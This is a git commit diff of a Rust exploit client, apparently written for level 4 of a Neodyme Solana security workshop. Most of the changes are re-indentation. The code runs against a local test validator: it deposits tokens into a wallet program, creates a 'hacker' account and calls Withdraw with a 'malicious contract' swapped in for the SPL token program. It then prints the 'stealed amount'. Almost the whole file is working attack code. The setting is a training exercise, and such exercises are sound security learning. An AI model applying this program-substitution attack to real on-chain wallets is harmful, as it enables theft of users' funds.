f53bdad5abf102dcd6c7cfddf024656aac7eea55
NonFungibleHacker <julioiglesiasp@gmail.com>
2022-08-26 22:28:02 -0400

    Adding level4

--- neodyme-workshop-remote-PoCs/level4-hack/client/src/bin/tok.rs
+++ neodyme-workshop-remote-PoCs/level4-hack/client/src/bin/tok.rs
@@ -27,50 +27,50 @@ use spl_associated_token_account:: {
 
 use owo_colors::OwoColorize;
 use borsh::{BorshDeserialize, BorshSerialize};
+
 #[derive(Debug, BorshDeserialize, BorshSerialize)]
+    pub enum WalletInstruction {
+        Initialize,
+        Deposit { amount: u64 },
+        Withdraw { amount: u64 },
+    }
 
-pub enum WalletInstruction {
-    Initialize,
-    Deposit { amount: u64 },
-    Withdraw { amount: u64 },
-}
+    pub fn get_wallet_address(owner: &Pubkey, wallet_program: &Pubkey) -> (Pubkey, u8) {
+        Pubkey::find_program_address(&[&owner.to_bytes()], wallet_program)
+    }
 
-pub fn get_wallet_address(owner: &Pubkey, wallet_program: &Pubkey) -> (Pubkey, u8) {
-    Pubkey::find_program_address(&[&owner.to_bytes()], wallet_program)
-}
-
-pub fn get_authority(wallet_program: &Pubkey) -> (Pubkey, u8) {
-    Pubkey::find_program_address(&[], wallet_program)
-}
+    pub fn get_authority(wallet_program: &Pubkey) -> (Pubkey, u8) {
+        Pubkey::find_program_address(&[], wallet_program)
+    }
 
 
 fn main() {
 
-    //setup_logging(LogLevel::TRACE);
-    let programa_keypair = read_keypair_file("./target/so/level4-keypair.json").unwrap();
-    let programa = programa_keypair.pubkey();
+        //setup_logging(LogLevel::TRACE);
+        let programa_keypair = read_keypair_file("./target/so/level4-keypair.json").unwrap();
+        let programa = programa_keypair.pubkey();
 
-    let cliente1 = String::from("http://localhost:8899");
+        let cliente1 = String::from("http://localhost:8899");
+        
+        let payer = Keypair::new();
+        let mint_account = Keypair::new();
+
+        println!("Creating the RpcClient and airdropping");
+        
     
-    let payer = Keypair::new();
-    let mint_account = Keypair::new();
+        let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());
 
-    println!("Creating the RpcClient and airdropping");
-    
- 
-    let env = RpcClient::new_with_commitment(cliente1, CommitmentConfig::confirmed());
-
-    match env.request_airdrop(&payer.pubkey(), LAMPORTS_PER_SOL * 100) {
-        Ok(sig) => loop {
-            if let Ok(confirmed) = env.confirm_transaction(&sig) {
-                if confirmed {
-                    println!("Transaction: {} Status: {}", sig, confirmed);
-                    break;
+        match env.request_airdrop(&payer.pubkey(), LAMPORTS_PER_SOL * 100) {
+            Ok(sig) => loop {
+                if let Ok(confirmed) = env.confirm_transaction(&sig) {
+                    if confirmed {
+                        println!("Transaction: {} Status: {}", sig, confirmed);
+                        break;
+                    }
                 }
-            }
-        },
-        Err(_) => println!("Error requesting airdrop"),
-    };
+            },
+            Err(_) => println!("Error requesting airdrop"),
+        };
 
         let (wallet_pda, _) = get_wallet_address(&payer.pubkey(), &programa);
         let (program_pda, _) = get_authority(&programa);
@@ -126,21 +126,21 @@ fn main() {
                 data: WalletInstruction::Initialize.try_to_vec().unwrap(),
             };
 
-            let recent_blockhash = env.get_latest_blockhash().unwrap();
+        let recent_blockhash = env.get_latest_blockhash().unwrap();
     
             
-            let tx_init = Transaction::new_signed_with_payer(
-                &[tx_init],
-                Some(&payer.pubkey()),
-                &[&payer],
-                recent_blockhash,
-            );
+        let tx_init = Transaction::new_signed_with_payer(
+            &[tx_init],
+            Some(&payer.pubkey()),
+            &[&payer],
+            recent_blockhash,
+        );
             
-    env.send_and_confirm_transaction(&tx_init).unwrap();
+        env.send_and_confirm_transaction(&tx_init).unwrap();
 
 
-    // Creating ATA owner and ATA wallet
-    let ata_account = Keypair::new();
+        // Creating ATA owner and ATA wallet
+        let ata_account = Keypair::new();
 
         let ata_create_tx = solana_program::system_instruction::create_account(
             &payer.pubkey(),
@@ -148,9 +148,9 @@ fn main() {
             LAMPORTS_PER_SOL,
             Account::LEN as u64, 
             &spl_token::ID,
-            );
+        );
 
-          let ata_tx = create_associated_token_account(
+        let ata_tx = create_associated_token_account(
             &payer.pubkey(),
             &ata_account.pubkey(),
             &mint_account.pubkey(),
@@ -207,121 +207,119 @@ fn main() {
 
         println!("Depositing 10000");
 
-    let tx_create = 
-        Instruction {
-            program_id: programa,
-            accounts: vec![
-                AccountMeta::new(wallet_pda, false),
-                AccountMeta::new(ata_token, false),
-                AccountMeta::new_readonly(ata_account.pubkey(), true),
-                AccountMeta::new_readonly(mint_account.pubkey(), true),
-                AccountMeta::new_readonly(spl_token::id(), false),
-            ],
-            data: WalletInstruction::Deposit { amount: 10000 }.try_to_vec().unwrap(),
+        let tx_create = 
+            Instruction {
+                program_id: programa,
+                accounts: vec![
+                    AccountMeta::new(wallet_pda, false),
+                    AccountMeta::new(ata_token, false),
+                    AccountMeta::new_readonly(ata_account.pubkey(), true),
+                    AccountMeta::new_readonly(mint_account.pubkey(), true),
+                    AccountMeta::new_readonly(spl_token::id(), false),
+                ],
+                data: WalletInstruction::Deposit { amount: 10000 }.try_to_vec().unwrap(),
         };
     
-    let recent_blockhash = env.get_latest_blockhash().unwrap();
+        let recent_blockhash = env.get_latest_blockhash().unwrap();
     
-            let tx_create = Transaction::new_signed_with_payer(
-                &[tx_create],
-                Some(&payer.pubkey()),
-                &[&payer, &ata_account, &mint_account],
-                recent_blockhash,
-            );
+        let tx_create = Transaction::new_signed_with_payer(
+            &[tx_create],
+            Some(&payer.pubkey()),
+            &[&payer, &ata_account, &mint_account],
+            recent_blockhash,
+        );
             
-    env.send_and_confirm_transaction(&tx_create).unwrap();
+        env.send_and_confirm_transaction(&tx_create).unwrap();
 
-    let prog_pda_data = env.get_account(&wallet_pda).unwrap().data;
-    let wall_amount_orig = Account::unpack(&prog_pda_data).unwrap().amount;
- 
-    let hacker = Keypair::new();
+        let prog_pda_data = env.get_account(&wallet_pda).unwrap().data;
+        let wall_amount_orig = Account::unpack(&prog_pda_data).unwrap().amount;
+    
+        let hacker = Keypair::new();
 
-    match env.request_airdrop(&hacker.pubkey(), LAMPORTS_PER_SOL * 100) {
-        Ok(sig) => loop {
-            if let Ok(confirmed) = env.confirm_transaction(&sig) {
-                if confirmed {
-                    println!("Transaction: {} Status: {}", sig, confirmed);
-                    break;
+        match env.request_airdrop(&hacker.pubkey(), LAMPORTS_PER_SOL * 100) {
+            Ok(sig) => loop {
+                if let Ok(confirmed) = env.confirm_transaction(&sig) {
+                    if confirmed {
+                        println!("Transaction: {} Status: {}", sig, confirmed);
+                        break;
+                    }
                 }
-            }
-        },
-        Err(_) => println!("Error requesting airdrop"),
-    };
+            },
+            Err(_) => println!("Error requesting airdrop"),
+        };
 
-    let (hack_wallet, _) = get_wallet_address(&hacker.pubkey(), &programa);
+        let (hack_wallet, _) = get_wallet_address(&hacker.pubkey(), &programa);
 
-    println!("Stealing lamports");
+        println!("Stealing lamports");
 
-    let hack_init = Instruction {
-        program_id: programa,
-        accounts: vec![
-            AccountMeta::new(hack_wallet, false),
-            AccountMeta::new_readonly(program_pda, false),
-            AccountMeta::new(hacker.pubkey(), true),
-            AccountMeta::new(mint_account.pubkey(), false),
-            AccountMeta::new_readonly(rent_id(), false),
-            AccountMeta::new_readonly(spl_token::id(), false),
-            AccountMeta::new_readonly(system_program::id(), false),
-        ],
-        data: WalletInstruction::Initialize.try_to_vec().unwrap(),
-    };
+        let hack_init = Instruction {
+            program_id: programa,
+            accounts: vec![
+                AccountMeta::new(hack_wallet, false),
+                AccountMeta::new_readonly(program_pda, false),
+                AccountMeta::new(hacker.pubkey(), true),
+                AccountMeta::new(mint_account.pubkey(), false),
+                AccountMeta::new_readonly(rent_id(), false),
+                AccountMeta::new_readonly(spl_token::id(), false),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Initialize.try_to_vec().unwrap(),
+        };
 
-    let recent_blockhash = env.get_latest_blockhash().unwrap();
-
-    
-    let hack_init = Transaction::new_signed_with_payer(
-        &[hack_init],
-        Some(&hacker.pubkey()),
-        &[&hacker],
-        recent_blockhash,
-    );
-    
-    env.send_and_confirm_transaction(&hack_init).unwrap();
-
-    let hack_amount_1 = env.get_account(&hack_wallet).unwrap().data;
-    let hack_amount_orig= Account::unpack(&hack_amount_1).unwrap().amount;
-
-    //Deploy the malicious contract
-    let myspl_keypair = read_keypair_file("./target/so/myspl-keypair.json").unwrap();
-    let myspl = myspl_keypair.pubkey();
+        let recent_blockhash = env.get_latest_blockhash().unwrap();
 
     
-    let hack_tx = Instruction {
-        program_id: programa,
-        accounts: vec![
-            AccountMeta::new(hack_wallet, false),
-            AccountMeta::new_readonly(program_pda, false),
-            AccountMeta::new_readonly(hacker.pubkey(), true),
-            AccountMeta::new(wallet_pda, false),
-            AccountMeta::new_readonly(spl_token::ID, false),
-            AccountMeta::new_readonly(myspl, false),
-        ],
-        data: WalletInstruction::Withdraw { amount: 10000 }.try_to_vec().unwrap(),
-    };
-     
-
-    let recent_blockhash = env.get_latest_blockhash().unwrap();
-
+        let hack_init = Transaction::new_signed_with_payer(
+            &[hack_init],
+            Some(&hacker.pubkey()),
+            &[&hacker],
+            recent_blockhash,
+        );
     
-    let hack = Transaction::new_signed_with_payer(
-        &[hack_tx],
-        Some(&hacker.pubkey()),
-        &[&hacker],
-        recent_blockhash,
-    );
-    
-    env.send_and_confirm_transaction(&hack).unwrap();
+        env.send_and_confirm_transaction(&hack_init).unwrap();
 
-    let prog_pda_data_2 = env.get_account(&wallet_pda).unwrap().data;
-    let wall_amount_final= Account::unpack(&prog_pda_data_2).unwrap().amount;
-    let hack_amount_1 = env.get_account(&hack_wallet).unwrap().data;
-    let hack_amount_final= Account::unpack(&hack_amount_1).unwrap().amount;
+        let hack_amount_1 = env.get_account(&hack_wallet).unwrap().data;
+        let hack_amount_orig= Account::unpack(&hack_amount_1).unwrap().amount;
 
-    if wall_amount_orig > wall_amount_final && hack_amount_final > hack_amount_orig {
-        println!("{} {:?}", "[*Hax*] stealed amount:".blue().bold(), hack_amount_final.blue().on_yellow());
-    } else {
-        println!("Something went wroing! :(")
-    }
+        //Deploy the malicious contract
+        let myspl_keypair = read_keypair_file("./target/so/myspl-keypair.json").unwrap();
+        let myspl = myspl_keypair.pubkey();
+
+        
+        let hack_tx = Instruction {
+            program_id: programa,
+            accounts: vec![
+                AccountMeta::new(hack_wallet, false),
+                AccountMeta::new_readonly(program_pda, false),
+                AccountMeta::new_readonly(hacker.pubkey(), true),
+                AccountMeta::new(wallet_pda, false),
+                AccountMeta::new_readonly(spl_token::ID, false),
+                AccountMeta::new_readonly(myspl, false),
+            ],
+            data: WalletInstruction::Withdraw { amount: 10000 }.try_to_vec().unwrap(),
+        };
+        
+
+        let recent_blockhash = env.get_latest_blockhash().unwrap();
+
+        
+        let hack = Transaction::new_signed_with_payer(
+            &[hack_tx],
+            Some(&hacker.pubkey()),
+            &[&hacker],
+            recent_blockhash,
+        );
+        
+        env.send_and_confirm_transaction(&hack).unwrap();
+
+        let prog_pda_data_2 = env.get_account(&wallet_pda).unwrap().data;
+        let wall_amount_final= Account::unpack(&prog_pda_data_2).unwrap().amount;
+        let hack_amount_1 = env.get_account(&hack_wallet).unwrap().data;
+        let hack_amount_final= Account::unpack(&hack_amount_1).unwrap().amount;
+
+        if wall_amount_orig > wall_amount_final && hack_amount_final > hack_amount_orig {
+            println!("{} {:?}", "[*Hax*] stealed amount:".blue().bold(), hack_amount_final.blue().on_yellow()); } 
+            else { println!("Something went wroing! :(") }
     
 }
 
